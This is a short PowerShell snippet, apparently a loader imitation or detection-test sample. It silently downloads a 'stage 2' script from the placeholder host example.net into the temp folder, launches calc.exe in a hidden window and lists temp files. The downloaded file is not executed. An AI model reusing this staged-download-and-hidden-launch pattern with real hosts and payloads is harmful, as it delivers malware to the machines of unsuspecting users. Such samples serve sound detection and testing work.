
try { $Stage2Url = 'https://example.net/updater.ps1'; $WorkingPath = "$env:TEMP\stage1.bin"; curl.exe -s -L -o $WorkingPath $Stage2Url; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3 } catch { Write-Warning "Loader step failed" }
